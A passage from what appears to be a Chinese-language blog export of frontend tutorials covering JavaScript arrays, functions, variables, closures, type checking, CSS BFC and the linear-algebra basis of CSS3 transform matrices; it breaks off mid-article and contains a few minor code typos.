    <content type="text"><![CDATA[一、创建数组使用 new 操作符调用构造函数12var arr = new Array(20) // 创建了一个包含20项的数组var arr = new Array('a', 'b', 'c') // 创建了包含字符串 a b c 的三项数组 省略 new 操作符12var arr = Array(20)var arr = Array('a', 'b', 'c') 数组字面量12var arr = []var arr = ['a', 'b', 'c'] 【ES6】Array.of() 描述： 用于创建数组，用法和 new Array() 一样。弥补 Array() 构造函数的不足（即参数不同，行为不同），Array.of() 的行为始终一致，将传入的值作为数组的项，产生数组 参数：任意数量任意值 返回值：创建的数组 【ES6】Array.from(obj, func, context) 描述：用于将 类数组对象(拥有length属性的对象) 和 可遍历对象(部署iterable接口的对象，包括 Set/Map) 转为真正的数组 参数： {Object} obj 要转为数组的对象 {Function} func 一个函数，功能类似于数组的map方法，对每一个对象属性执行该函数，并返回由该函数的返回值组成的数组 {Object} context 第二个函数参数的执行环境(this指向) 返回值：生成的数组 二、数组检测使用 instanceof 操作符123if (value instanceof Array) &#123; // 对数组执行某些操作&#125; 使用 Array.isArray() 方法123if (Array.isArray(value)) &#123; // 对数组执行某些操作&#125; 使用 Object.prototype.toString.call()123if (Object.prototype.toString.call(obj) === '[object Array]')&#123; // 对数组执行某些操作&#125; 三、数组方法转换方法toLocalString()toString()valueOf()join()栈/队列 方法push() 描述：向数组的尾部追加项，并返回数组长度 参数：n多个值，会依次推入数组尾部 返回值： {Number} 数组长度 是否改变原数组：是 pop() 描述：移除数组最后一项，并返回该项 参数：无 返回值：返回移除项 是否改变原数组：是 shift() 描述：移除数组第一项，并返回该项 参数：无 返回值：返回移除项 是否改变原数组：是 unshift() 描述：在数组最前端添加项，并返回数组长度 参数：n多个值，会依次添加到数组前端 返回值： {Number} 数组长度 是否改变原数组：是 排序方法reverse() 描述：反转数组项的顺序 参数：无 返回值：修改后的数组 是否改变原数组：是 sort() 描述：对数组进行排序，默认情况下，按照升序排序，sort方法调用每个数组项的 toString() 方法，进行字符串比较 参数：【可选】函数 1231、如果第一个参数 应该位于 第二个参数 之前 返回一个负数2、如果第一个参数 应该位于 第二个参数 之后 返回一个正数3、并列返回0 返回值：排序后的数组 是否改变原数组：是 操作方法concat() 描述：基于当前数组的所有项创建一个新数组 参数：【可选】任意数量的任意值 返回值：返回新数组 是否改变原数组：否 slice() 描述：基于当前数组一或多个项创建新数组（截取数组片段） 参数：接收一或两个参数，分别是返回项的起始和结束位置 返回值： 123456781、只传起始位置（即一个参数） 返回：从起始位置到数组末尾的项组成的数组2、传递两个参数 返回：从起始位置到结束位置(不包含结束位置)的项组成的数组3、传递负数 返回：会用数组长度加上该负数来确定相应的位置，并按照1、2的规则返回新数组4、起始位置大于结束位置 返回：空数组 是否改变原数组：否 splice() 描述：对数组的项进行 删除、插入、替换 等操作，功能十分强大 参数： 123第一个参数：要删除的第一项的位置第二个参数：要删除的项数第三个参数（第四个、第五个......）：插入的项 返回值：由删除的项组成的数组 是否改变原数组：是 【ES6】copyWithin() 描述：在数组内部，将指定位置的成员拷贝到其他位置（会覆盖原有成员） 参数： 123第一个参数：要拷贝的目标位置(target)第二个参数：从该位置读取数据，默认是0，负值表示倒数第三个参数：读取到该位置结束，默认是 数组的长度，不包含该位置，负值表示倒数 返回值：修改后的数组 是否改变原数组：是 【ES6】fill() 描述：使用给定值，填充数组 参数： 123第一个参数：填充的值第二个参数：填充的起始位置第三个参数：填充的结束位置(不包含该位置) 返回值：（待测） 是否改变原数组：是 查找/位置方法indexOf()lastIndexOf() 描述：在数组中查找某一项的位置 indexOf() 从前往后查找， lastIndexOf() 从后往前查找 参数： 12第一个参数：要查找的项第二个参数：查找起点位置索引 返回值：返回查找项在数组中的位置，未找到返回-1 注意：在查找过程中使用全等操作符(===) 【ES6】find() 描述：用于找到第一个符合条件的数组成员 参数：一个函数，函数的参数：1、项。2、项的索引。3、数组对象本身 返回值：如果有符合添加的项，返回该项的值，如果没有找到符合条件的项，返回 undefined 【ES6】findIndex() 描述：与find()方法功能一样，唯一不同的是，返回的是项的位置，未找到返回 -1 【ES7】includes() 描述：查找数组中是否包含给定值 参数： 12第一个参数：要查找的值第二个参数：查找的起始位置，默认是0，负数表示倒数，超出范围会重置为0 返回值：true 包含， false 不包含 includes 相比于 indexOf 的优势有两点：1、更加语义化，不需要判断返回值是否为 -1。2、由于 indexOf 底层在判断是否相等时使用的是全等操作符 ===，这会导致使用 indexOf 查找 NaN 时查不到，而 includes 则不存在这样的问题 迭代方法forEach()every()some()filter()map()12345678910111213描述：迭代数组，对数组的每一项执行给定函数参数：第一个参数：函数 函数接收三个参数 1、数组的项 2、该项在数组中的位置 3、数组对象本身 第二个参数：第一个参数的执行环境(this指向)返回值： forEach() 无返回值 every() 对数组运行给定函数，如果该函数对每一项都返回true，则返回true some() 对数组运行给定函数，如果该函数对任意一项返回true，则返回true filter() 对数组执行给定函数，返回该函数返回true的项组成的数组 map() 对数组执行给定函数，返回每次函数调用结果组成的数组 【ES6】entries()，keys()和values() 描述：entries()，keys() 和 values() 都用于遍历数组。它们都返回一个遍历器对象（详见《Iterator》一章），可以用 for...of 循环进行遍历，唯一的区别是 keys() 是对键名的遍历、values() 是对键值的遍历，entries() 是对键值对的遍历。 归并方法reduce()reduceRight() 描述：迭代数组的所有项，构建一个最终的返回值 参数： 123456第一个参数：函数，函数接收的参数： 1、前一项(pre) 2、当前项(cur) 3、当前项的索引(index) 4、数组对象本身(array)第二个参数：归并的初始值 返回值：迭代的最终值 注意：第一次迭代的时候，pre是数组的第一项，cur是数组的第二项，reduce() 和 reduceRight() 除了迭代方向不一致外，其他完全相同]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-函数]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[一、创建函数函数声明123function fnName() &#123;&#125; 函数表达式123var fnName = function () &#123;&#125; 使用Function构造函数12// 参数：Function 接收任意多的参数，但最后一个参数总被认为是函数体，前面的参数是传入新函数的参数var fnName = new Function(a, b, c, 'return a + b + c'); 【ES6】箭头函数123var fnName = () =&gt; &#123;&#125; 二、函数的内部属性anguments 类型：类数组对象，包含着传入函数的所有参数，和length属性 属性： anguments.length // 实际传入函数参数的个数 anguments.callee【严格模式报错】 // 指向拥有这个anguments对象的函数，即函数本身 this函数据以执行的执行环境 箭头函数无 this 三、函数的属性和方法属性fnName.caller 描述：保存着调用当前函数的函数的引用，如果在全局作用域调用当前函数，则返回 null fnName.length 描述：表示函数希望接收的命名参数的个数注意：anguments.length 是实际传入函数参数的个数，而 fnName.length 是函数希望接收命名参数的个数，【ES6函数默认值对length的影响】：指定默认值以及在指定默认值的参数之后的所有参数，都不会计算到length中 fnName.prototype 描述：保存函数的原型对象 【ES6】fnName.name 描述：获取函数的函数名 返回值： 对于函数声明：返回函数名 对于匿名函数表达式：ES5返回空字符串，ES6返回变量的名字 对于具名函数表达式：返回函数的原名字 对于使用 new Function 创建的函数：返回 ‘anonymous’ 对于使用bind方法返回的函数：返回 ‘bound 函数名’ 方法fnName.apply()fnName.call() 描述：上面两个方法都用来在特殊的作用域调用函数，实际上等于设置函数体内的 this 对象的值 参数： 第一个参数都是 this 的值 第二个参数：apply 接收 anguments 对象或数组，call 必须逐个列举出来 fnName.bind() 描述：根据已有函数，创建一个被绑定新 this 值的函数 参数：指定 this 值 返回值： {Function} 被指定 this 值的新函数 四、ES6对函数的扩展参数默认值123function (a = 2, b = 3) &#123;&#125; 【注意：函数的length属性，不会计算指定默认值的参数以及其后的所有参数】 rest参数 […变量名] 描述：用于获取函数多余的参数，将其放入一个数组 注意： rest参数后面，不能有其他参数，否则会报错 rest参数不会被计算到函数的length属性中 12345function test(a, b, ...c) &#123; console.log(c);&#125;test(1, 2, 3, 4) // [3, 4]test.length // 2 箭头函数箭头函数有几点需要注意： 函数体内的 this 对象是函数定义是所在的对象，而不是使用时的对象 不能用箭头函数当做构造函数，也就是说不能使用new命令，否则会报错 不可以使用 arguments 对象，该对象在函数体内不存在。如果要用，可以用 Rest参数 代替。 不可以使用 yield 命令，因此箭头函数不能用作 Generator 函数。 由于箭头函数没有自己的 this，所以当然也就不能用 call()、apply()、bind() 这些方法去改变 this 的指向。 尾递归【注意：ES6的尾调用优化只在严格模式下开启，正常模式是无效的。】 ES6明确规定，所有ECMAScript的实现，都必须部署“尾调用优化”。这就是说，在ES6中，只要使用尾递归，就不会发生栈溢出，相对节省内存。相关概念： 尾调用：函数的最后一步调用另一个函数，叫做尾调用尾调用的好处是：只保留内层函数的调用帧，节省内存 尾递归：函数尾调用自身，叫做尾递归 柯里化：将多参数函数转成单参数函数 因为尾调用优化的本质是，只保留内层函数的调用帧，ES6的尾调用只在严格模式下生效，那么在非严格模式下是否可以进行尾调用优化呢？答案是可以的，有两种方案，一种是使用蹦床函数，一种是真正的尾调用，阮一峰的教程里有讲 new.target【ES6】new 操作符用来调用函数或ES6的类，从而创建一个实例，ES6为new操作符添加一个属性即：new.target，它保存着 new 操作符所作用的那个函数或类，一般用在构造函数里，如果使用函数或类时没有使用 new 操作符，那么 new.target 的值为 undefined。 利用 new.target 就可以写出不能单独被实例化，必须要继承后才能使用的类： 12345678910111213class Super &#123; constructor() &#123; if (new.target === Super) &#123; throw new Error('不能单独实例化') &#125; &#125;&#125;class Sub extends Super &#123;&#125;new Super() // 报错new Sub() // 正常使用]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-变量]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_%E5%8F%98%E9%87%8F%2F</url>
    <content type="text"><![CDATA[一、变量类型js的基本数据类型12Undefined、Null、Boolean、Number、String、ECMAScript 2015 新增:Symbol(创建后独一无二且不可变的数据类型 ) 变量类型区别栈：原始数据类型（Undefined，Null，Boolean，Number、String）堆：引用数据类型（对象、数组和函数） 两种类型的区别是：存储位置不同；原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储；引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体 判断变量类型1、typeof typeof 操作符返回的是类型字符串，它的返回值有6种取值： 12345678typeof 3 // "number"typeof "abc" // "string"typeof &#123;&#125; // "object"typeof true // "boolean"typeof undefined // "undefined"typeof function () &#123;&#125; // "function"typeof null // "object""typeof [] // "object" 2、instanceof instanceof操作符用于检查某个对象的原型链是否包含某个构造函数的prototype属性。例如： 12345[1, 2, 3] instanceof Array // true/abc/ instanceof RegExp // true(&#123;&#125;) instanceof Object // true(function()&#123;&#125;) instanceof Function // true(new Date) instanceof Date // true instanceof对基本数据类型不起作用，因为基本数据类型没有原型链。 123453 instanceof Number // falsetrue instanceof Boolean // false'abc' instanceof String // falsenull instanceof XXX // always falseundefined instanceof XXX // always false 3、toString toString方法是最为可靠的类型检测手段，它会将当前对象转换为字符串并输出。 toString属性定义在Object.prototype上，因而所有对象都拥有toString方法。 但Array, Date等对象会重写从Object.prototype继承来的toString， 所以最好用Object.prototype.toString来检测类型。 123456789101112toString = Object.prototype.toString;toString.call(new Date); // [object Date]toString.call(new String); // [object String]toString.call(Math); // [object Math]toString.call(3); // [object Number]toString.call([]); // [object Array]toString.call(&#123;&#125;); // [object Object]// Since JavaScript 1.8.5toString.call(undefined); // [object Undefined]toString.call(null); // [object Null] 总结 typeof只能检测基本数据类型，对于null还有Bug； instanceof适用于检测对象，它是基于原型链运作的； constructor指向的是最初创建者，而且容易伪造，不适合做类型判断； toString适用于ECMA内置JavaScript类型（包括基本数据类型和内置对象）的类型判断； 基于引用判等的类型检查都有跨窗口问题，比如instanceof和constructor。 总之，如果你要判断的是基本数据类型或JavaScript内置对象，使用toString； 如果要判断的时自定义类型，请使用instanceof 另外Duck Typing的方式也非常可行123isWindow: function (obj) &#123; return obj &amp;&amp; typeof obj === 'object' &amp;&amp; "setInterval" in obj;&#125; 二、变量作用域JavaScript语言提供了函数作用域，同时JavaScript允许嵌套的函数定义。 有趣的是，内部函数（inner function）的生命周期可能超过父级函数。 这时便会显示出JavaScript的一个特殊现象：闭包。 闭包为面向对象编程提供了另外一种有趣的封装方式，我们无需为私有变量声明private。 函数作用域程序设计语言中的作用域（scope）控制着变量和参数的可见性和生命周期。 它的重要性体现在避免命名冲突和自动内存管理两个方面，极大地减少了程序员的工作。多数编程语言都拥有块作用域（block scope），由一对大括号限定其中变量的作用域。 比如C++的变量只在块内可见，变量被定义时执行内存申请和构造函数， 控制流退出代码块后内部的变量又被析构和内存回收。不幸的是JavaScript提供了块语法，却不提供块作用域，而是提供函数作用域。 这意味着参数和变量在函数外部不可见，在函数内部始终可见。 闭包JavaScript允许在函数中嵌套定义函数，这意味着内部函数（inner function）也可以访问父级函数的上下文（包括参数和变量）。 有趣的是，有时内部函数拥有更长的生命周期。来一个典型的面试题：12345678function f() &#123; for (var i = 0; i &lt; 3, i++) &#123; setTimeout(function () &#123; console.log(i); &#125;, 1000); &#125;&#125;f(); // 333 i是function f中定义的变量，在传递给setTimeout的函数中，i仍然有效（其实它叫做闭包变量）。 所以1s后console.log时i仍然是function f中定义的那个i，这时它的值为3。 这意味着内部函数可以访问真正的外部变量，而不是外部变量的副本。 函数可以访问它被创建时的所有上下文变量，这就叫做闭包现象。 如果我们希望上述代码输出123，我们需要开启一个子作用域。而JavaScript只提供函数作用域，所以我们需要添加一层函数：123456789function f() &#123; for (var i = 0; i &lt; 3; i++) &#123; !function (i) &#123; setTimeout(function () &#123; console.log(i); &#125;, 1000); &#125;(i); &#125;&#125; 这时输出便是123了。其中的!是为了让JavaScript将这一句解析为表达式，而不是函数声明。 其实任何运算符都可以(+-），但如果没有便是语法错。 变量提升一般编程语言建议将变量定义推迟，越晚越好。然而在JavaScript中不是这样， 应当将一切变量都在函数体最上方声明。例如：12345var p = &#123;name: 'harttle'&#125;;function foo() &#123; console.log(p.name); var p = &#123;name: 'alice'&#125;;&#125; 上述代码将产生运行时错误：1Uncaught TypeError: Cannot read property &apos;name&apos; of undefined 这是因为在JavaScript的函数作用域实现中，所有变量声明（var xxx）都会被提升。 就像在函数体刚进入时声明这些变量一样。上述代码相当于：123456var p = &#123;name: 'harttle'&#125;;function foo() &#123; var p; console.log(p.name); p = &#123;name: 'alice'&#125;;&#125; Note：变量声明与初始化是两回事，变量提升指的是声明提升，初始化/赋值并不会提升。 闭包封装基于类声明的面向对象语言不通，JavaScript基于原型继承。 JavaScript并未提供public, protected, private等关键字。 而JavaScript的闭包机制则可以完美地提供封装。你只需要： 1、将public属性赋值到对象属性。 2、将private属性声明为局部变量或内部函数。 12345678910function Counter() &#123; var i = 0; return &#123; count: function () &#123;i++;&#125; get: function () &#123;return i;&#125; &#125;&#125;var counter = Counter();counter.count();counter.get(); // 1 其中i便是private；count,get便是public。 变量转换parseInt parseFloat parseInt() 函数可解析一个字符串，并返回一个整数。1parseInt(string, radix) parseFloat() 函数可解析一个字符串，并返回一个浮点数。1parseFloat(string) 考验你对map的了解，考验你对parseInt方法的了解12345678["1","2","3"].map(parseInt) // [1, NaN, NaN]["1","2","3"].map(function ()&#123; console.log(arguments) &#125;)// ["1", 0, Array[3]]// ["2", 1, Array[3]]// ["3", 2, Array[3]] toString方法它的作用是返回一个反映这个对象的字符串 所有对象继承了两个转换方法：toString() and valueOf() 12345678910111213//返回相应的字符串console.log( (&#123;x: 1, y: 1 &#125;).toString() ); // [object Object]console.log([1,2,3].toString()); // 1,2,3console.log((function (x) &#123;f(x);&#125;).toString()); //function (x)&#123;f(x); &#125;console.log(/\d+/g.toString()); // /\d+/gconsole.log(new Date(2015,4,4).toString()); // Mon May 04 2015 00:00:00 GMT+0800console.log(new Date(2015,4,4).valueOf()); // 1430668800000 valueOf方法它的作用是返回它相应的原始值，一般都是隐式调用它 每个JavaScript固有对象的 valueOf 方法定义不同 对象 返回值 Array 数组的元素被转换为字符串，这些字符串由逗号分隔，连接在一起。其操作与 Array.toString 和 Array.join 方法相同。 Boolean Boolean 值。 Date 存储的时间是从 1970 年 1 月 1 日午夜开始计的毫秒数 UTC。 Function 函数本身。 Number 数字值。 Object 对象本身。这是默认情况。 String 字符串值。 Math 和 Error 对象没有 valueOf 方法。 ===运算符判断相等的流程 如果两个值不是相同类型，它们不相等 如果两个值都是null或者都是undefined，它们相等 如果两个值都是布尔类型true或者都是false，它们相等 如果其中有一个是NaN，它们不相等 如果都是数值型并且数值相等，他们相等， -0等于0 如果他们都是字符串并且在相同位置包含相同的16位值，他它们相等；如果在长度或者内容上不等，它们不相等；两个字符串显示结果相同但是编码不同==和===都认为他们不相等 如果他们指向相同对象、数组、函数，它们相等；如果指向不同对象，他们不相等 ==运算符判断相等的流程 如果两个值类型相同，按照===比较方法进行比较 如果类型不同，使用如下规则进行比较 如果其中一个值是null，另一个是undefined，它们相等 如果一个值是数字另一个是字符串，将字符串转换为数字进行比较 如果有布尔类型，将true转换为1，false转换为0，然后用==规则继续比较 如果一个值是对象，另一个是数字或字符串，将对象转换为原始值然后用==规则继续比较其他所有情况都认为不相等 对象到字符串的转换步骤 如果对象有valueOf()方法并且返回元素值，javascript将返回值转换为数字作为结果 否则，如果对象有toString()并且返回原始值，javascript将返回结果转换为数字作为结果 否则，throws a TypeError &lt;, &gt;, &lt;=, &gt;=的比较规则所有比较运算符都支持任意类型，但是比较只支持数字和字符串，所以需要执行必要的转换然后进行比较，转换规则如下: 如果操作数是对象，转换为原始值：如果valueOf方法返回原始值，则使用这个值，否则使用toString方法的结果，如果转换失败则报错 经过必要的对象到原始值的转换后，如果两个操作数都是字符串，按照字母顺序进行比较（他们的16位unicode值的大小） 否则，如果有一个操作数不是字符串，将两个操作数转换为数字进行比较 +运算符工作流程 如果有操作数是对象，转换为原始值 此时如果有一个操作数是字符串，其他的操作数都转换为字符串并执行连接 否则：所有操作数都转换为数字并执行加法]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>变量</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flex属性详解]]></title>
    <url>%2F2018%2F04%2F17%2FCSS3_flex%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
        <tag>flex</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS-BFC]]></title>
    <url>%2F2018%2F04%2F17%2FCSS_BFC%2F</url>
    <content type="text"><![CDATA[BOX 概念：CSS布局的基本单位 解释：BOX是CSS布局的基本单位，元素的类型和dispaly属性，决定了这个元素的的BOX类型，BOX的类型分为： 【block-level box】 display属性值为：block、list-item、table 的元素会生成 block-levle box，并且参与 block formatting context 布局 【inline-level box】 display属性值为：inline、inline-block、inline-table 的元素会生成 inline-level box，并参与 inline formatting context 布局 【run-in box】 CSS3中定义 Formatting Context 概念：Formatting Context 【格式化上下文】 解释：它是一个决定如何渲染文档的容器，常见的 Formatting Context 如下： 【Block formatting context】(BFC) 【Inline formatting context】(IFC) 【Grid formatting context】(GFC) 【Flex formatting context】(FFC) BFC创建一个独立的渲染区域，并规定了 block-level box 如何布局，且与这个区域外部毫不相关 BFC布局规则如下(注意BFC只影响块儿级盒)： 内部Box按垂直方向一个接一个的放置 Box垂直方向的距离由margin值决定，并且属于同一个BFC的两个相邻的box的margin值会重叠 每个元素的 margin-box 的左边与包含块儿 border-box 的左边相接触 BFC的区域不会与浮动盒子重叠 BFC就是一个隔绝的容器，容器里面的子元素不影响外面元素的布局，反之亦然 计算BFC的高度时，浮动元素也参与计算 以下CSS属性，将会触发BFC： 根元素，即 &lt;html&gt; float 属性值不为 none position 属性的值为 absolute 或 fixed overflow 属性值不为 visible display 属性值为 inline-block, table-cell, table-caption BFC的应用 自适应两栏布局 利用的是 BFC 不与浮动元素重叠的特性 清楚浮动 利用BFC内浮动元素也参与BFC高度计算的特性 解决margin折叠(传递) 子元素的margin-top传递到父级 防止margin重叠 因为BFC内相邻元素的margin值会重叠，如果给其中一个元素包一层，并设置为BFC，又因为BFC内子元素的布局与外部元素互不影响的特性，就可以解决重叠的问题 IE haslayoutIE 是个奇葩，自己搞一个叫做 haslayout 的东西，类似 BFC，一般在 IE 中显示有问题的东西都可以通过触发 haslayout 来解决，触发方法有很多： zoom 属性设置为除 normal 以外的值 width/height 除 auto 以外的值 float 除 none 以外的值]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>BFC</tag>
        <tag>盒子模型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3-从矩阵和空间操作的关系理解CSS3的transform]]></title>
    <url>%2F2018%2F04%2F17%2FCSS3_%E4%BB%8E%E7%9F%A9%E9%98%B5%E5%92%8C%E7%A9%BA%E9%97%B4%E6%93%8D%E4%BD%9C%E7%9A%84%E5%85%B3%E7%B3%BB%E7%90%86%E8%A7%A3CSS3%E7%9A%84transform%2F</url>
    <content type="text"><![CDATA[从矩阵与空间操作的关系理解CSS3的transform概述矩阵，是线性代数中涉及的内容，线性代数在科学领域有很多应用的场景，如下： 大部分同学在大学时期应该都学过一本叫做线性代数的书，如果没猜错的话，你们的老师在教学的时候大多都是概念性的灌输，比如矩阵乘法如何运算，加法如何运算，大家只要记住就ok了，但是大部分同学都不理解，为什么矩阵的乘法要这样算？矩阵乘法的意义是什么？，特别是我们搞计算机的，如果有做过 2D/3D 变换的同学一定听说过矩阵，比如在前端的CSS中，使用 transform 做 2D/3D 的变换，其中就应用到了矩阵的知识，这篇文章并不是一篇数学性质的文章，所以大家不要看了感觉一阵眩晕，这篇文章的目的在于：从矩阵与空间之间的关系讲述：为什么矩阵可以应用在空间操作(变换)。或者用一句大白话：这玩意儿怎么就能让div翻过来，转过去，扭的他爹都不认识他的。 先看一段 css 代码： 1234/* 2D */transform: matrix(1, 0, 0, 1, 0, 0);/* 3D */transform: matrix(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); 上面两行 css 代码其实什么变换都不会做，因为那是变换的默认状态，即没有变换。但是其中使用到了 matrix，翻译成中文叫做：矩阵。如果有深入研究过 css 的同学对这两行代码也许不陌生，但是大多数人在使用 transform 变换时很少直接使用 matrix 矩阵，除非你不想让人看懂你在做些什么鸟变换…，所以更多的时候，我们会使用类似如下语法： 1transform: translateX(100px) rotateZ(30deg); 如上代码所示，一目了然，要做什么变换大家一看就知道了。但其实，这只是一个语法糖，其底层依然使用的是 matrix。 如果想要理解矩阵为何可以应用到 2D/3D 变换，那么只从数值水平的角度理解是不够的，你需要从几何的角度去理解矩阵，这存在着根本性的差异。而这，也就是本篇文章的真正意义。 不过，这需要我们先了解一些必要的基本概念，这些概念至关重要，首先就是向量 向量什么是向量既然矩阵是线性代数的一部分，那么就不得不提到 向量，因为向量是线性代数最基础、最根源的组成部分，所以我们要先搞清楚，向量是什么？我说过，这篇文章不会很“数学”，所以大家不要被吓到。用一句话描述向量是什么： 向量：空间中的箭头 这个在大家的印象里应该很好理解，这个箭头由两个因素决定：方向 和 长度，我们先把目光局限在二维空间下，如图： 上图中，在一个坐标系中画了四个不同长度和方向的箭头，每个箭头从原点发出，他们代表了二维空间中的四个向量，在线性代数中，向量通常以原点作为起点。 如果你已经理解了“向量是空间中的箭头”这种观点，下面我们再进一步，我们重新用一句话来描述向量： 向量：是有序的数字列表 假设大家对坐标系的概念都有所了解，我们还是把目光局限在二维空间，在坐标系中任意选取单位长度，这样我们就能够使用一个一个的刻度来标刻这个坐标系，选取特定的方向为x/y轴的正方向，那么不难看出，每一个向量，都可以用唯一的一个坐标来表示，同样的，坐标系中的每一个坐标都对应着一个唯一的箭头(向量)，如下图： 在坐标系中，由于坐标通常用来标示一个点，如 P(2, 8) 表示点 P 的坐标为 (2, 8)，为了区分点和向量，在表示向量时，我们通常把坐标竖着写，然后用一对儿中括号来描述，如上图中的： 在三维空间也是一样的道理，如下图，我就不做重复的解释，唯一不同的是，每一个向量由 x/y/z 三个数字组成的坐标来表示： 对于向量，你只需要知道它是“空间中的箭头”或者“有序的数字列表”这就足够了，怎么样？不难理解吧，我们继续往下看，在坐标系中存在一种特殊的向量，我们称之为 基向量。 基向量基向量，也叫单位向量，是单位长度为1的向量，如下图中：i帽 和 j帽 就是这个二维坐标系的基向量： 对于向量，我们就先介绍到这里，这已经足够了。除了向量，还有一个概念需要大家了解，即线性变换。 线性变换“变换”本质上是“函数”的一种花哨的叫法，玩编程的都知道函数，与在数学中的概念类似，函数接收输入的内容，并输出对应的结果，如图： 变换也是同样的道理，只不过接收向量作为输入，并输出变换后的向量： 既然 “变换” 与 “函数” 本质相同，那么为什么叫变换而不叫函数呢？这实际上就暗示了我们，你可以把这个输入输出的过程，看做一个向量从初始状态到最终状态的一个变化过程，如下图： 现在，我们把情况宏观一下，目前只讨论一个向量的变换，我们知道，二维空间的一整个平面，可以看做是由无数个向量组成(或者无数个点组成，因为每一个点唯一标识一个向量，所以这里说平面由无数个向量组成)，假如这无数个向量同时做相同的变换，那其实就可以看做是平面的变换，如下图： 变换前： 变换后： 不过，并非所有变换都叫做线性变换，线性变换必须要满足下面两个条件： 1、直线在变换后仍然为直线，不能有所弯曲 2、原点不能移动 如下变换，就不是一个线性变换，因为直线变成了曲线： 如何用数值描述线性变换？在上一小节中我们知道，空间的变换也可以说是向量的变换，而向量在空间中，可以用一组有序的数字列表来表示(即向量的坐标)，所以向量变换前后，必然会引起“有序数字列表的变换”，那么我们是否可以用数字去描述变换呢？ 之前在向量一节中，我们了解过基向量，单位长度为1，其实空间中的任意一个向量我们都可以看做是：基向量变换后的和向量，如下图： 向量 v 的坐标是 ，如果我们把 3 和 -2 看做两个标量，也就是纯数字，那么向量 v 可以看做是基向量被标量缩放后相加得到的和向量： v = 3i + (-2j) 了解了这些，我们现在就通过一个例子，来认识一个至关重要的事实，假如我们有向量 v = -1i + 2j，如下图： 此时，基向量 i 的坐标是 (1, 0)【注意：为了方便，这里就用圆括号代表向量的坐标，下同】，基向量 j 的坐标是 (0, 1)，假设经过了某些变换之后，基向量 i 的坐标变为 (1， -2)，基向量 j 的坐标变为 (3， 0)，如下图： 那么变换后的向量 v 依然满足 v = -1i + 2j，如下： 以上例子所描述的事实，实际上是线性变换的性质的推论，该性质可以从几何角度表述为：线性变换后的网格平行且等距。 既然线性变换前后都满足该线性关系：v = -1i + 2j 那么很容易根据变换后 i帽 和 j帽 的坐标推算出变换后 v 的坐标： 也就是 (5, 2)，即： 那么我们是否可以认为，给定任意一个向量，其坐标 (x, y)，我们可以通过变换后的基向量的坐标推断出该向量变换后的坐标呢？答案是肯定的，假如基向量变换后的坐标 i帽 和 j帽 如下图： 那么任意向量 (x, y) 在经过变换后的坐标计算如下： 这告诉我们另外一个事实，二维空间的线性变换仅由四个数字完全确定，这四个数字就是基向量 i 变换后 i帽 的坐标，以及基向量 j 变换后 j帽 的坐标，如下图： 是不是很酷？只需要四个数字，我们就确定了二维空间的一个变换。通常，我们把这四个数字放到一个 2 x 2 的格子中，我们称之为 2 x 2 矩阵： 现在，当你再看到 2 x 2 矩阵的时候，你的第一几何直观反映应该是：它描述了一个二维空间的变换。 我们把情况一般化，如下图： 我们有一个 2 x 2 的矩阵 [a, c] [b, d]，其中 [a, c] 是基向量 i 变换后的坐标，[b, d] 是基向量 j 变换后的坐标，那么根据这个变换，以及线性变换的性质，我们可以推断出任意向量 [x, y] 变换后的坐标： 实际上，这就是数学家之所以这样定义 矩阵的向量乘法 的原因。 到了这里，让我们整理一下思路，首先，对于一个 2 x 2 的矩阵，你的直观几何感受应该是，第一列的两个数是对基向量 i 的变换，第二列的两个数是对基向量 j 的变换，这四个数字组成的 2 x 2 的矩阵，描述了一个对空间的线性变换，我们可以根据这个变换推断出任意一点(或者任意向量)变换后的坐标。 其实我么你还可以换一个角度考虑，我们就单纯的把 2 x 2 矩阵叫做变换，那么向量与矩阵的乘积，就要可以看做是该向量应用了这个变换。其实，这就是矩阵向量乘法的几何意义。 回到 CSS 的 transform说了一大堆，是时候回到 CSS 的 transform，我们来看一下2D变换下 transform 属性的 matrix 写法： 1transform: matrix(a, b, c, d, e, f); 在文章开始，我们知道各个参数默认值如下： 1transform: matrix(1, 0, 0, 1, 0, 0); 有的同学可能会问：说好的 2 x 2 矩阵也就是四个数字就能确定一个二维空间变换，你这里明明有6个数啊，其实，transform 2D变换是一个 3 * 3 的矩阵，为什么是这样？因为：位移(translate)，前面我们说过，线性变换要满足其中一个特点：原点不能移动，但是位移却使原点发生了移动，所以 2 x 2 矩阵满足不了需求，只能再加一列，也就是 3 x 3 的矩阵。 把 matrix 中的 a b c d e f 放到一个 3 x 3 的矩阵中应该是这样的： 其实，在没有位移(translate)的情况下，[a, b] [c, d] 四个数字组成的 2 x 2 矩阵是完全可以描述2D变换的，现在我们只看由 [a, b] [c, d] 组成的 2 x 2 矩阵： 我们把 a b c d 四个数字使用默认值替换一下，即：a = 1，b = 0，c = 0，d = 1，如下： 通过之前的介绍，我们在看到这个矩阵的时候，应该知道，第一列的坐标 (1, 0) 应该是基向量 i 变换后的坐标，但是基向量 i 在变换前的坐标就是 (1, 0)，也就是说没有任何变换，同理，基向量 j 也没有任何变换，所以说，这就是 a b c d 默认值设定为下面代码所示的值的原因： 123transform: matrix(a, b, c, d, e, f);// a b c d 默认值为 1 0 